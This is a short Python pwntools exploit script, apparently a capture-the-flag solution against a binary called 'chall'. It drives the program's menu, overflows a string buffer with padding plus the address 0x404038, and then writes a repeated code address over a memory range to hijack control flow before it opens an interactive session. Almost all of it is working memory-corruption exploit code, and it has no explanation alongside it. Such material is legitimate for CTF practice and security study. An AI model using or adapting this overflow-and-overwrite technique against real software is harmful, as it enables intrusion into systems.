from CustomLib import BeginPwn

from pwn import *

from pwnlib.util.packing import p8, p32, p64

import os

class cmd():
    def set_c_str(payload,size = None):
        target.sendline(b"1")
        target.recvuntil(b"c_str: ")
        if size != None:
            p.send(1,payload,size = size)
        else:
            p.send(1,payload)
        pass
    
    def get_c_str():
        target.sendline(b"2")
        target.recvuntil(b"c_str: ")
        return target.recvline()[:-1]
    
    def set_str(payload, size = None):
        target.sendline(b"3")
        #target.recvuntil(b"str: ")
        if size != None:
            p.send(1,payload,size = size)
        else:
            p.send(1,payload)
        return
    
    def get_str():
        target.sendline(b"4")
        #target.recvuntil(b"str: ")
        return target.recvline()[:-1]
    
    def exit():
        target.sendline(b"5")
        #target.recvuntil(b"bye!")
        return

brl = []
def a(x):
    brl.append(x)

a(0x401319)
a("main")
'''
a(0x4015BE)
a(0x4014F4)
a(0x40147A)
a(0x4016F5)
a(0x4016fa)
'''
a(0x4016DE)
p = BeginPwn("chall",brl,["continue\n"*2,"i r","continue\n"])

#p.debug()
p.process()

target = p.get_handle()

cmd.set_c_str(b"\xCC"*32+p64(0x404038)[:-1])
times = (0x404080-0x404038)//0x8
cmd.set_str((p64(0x4016DE)*times)[:-1])
#only 0x4016DE and 0x4016E2 worked
p.interactive()
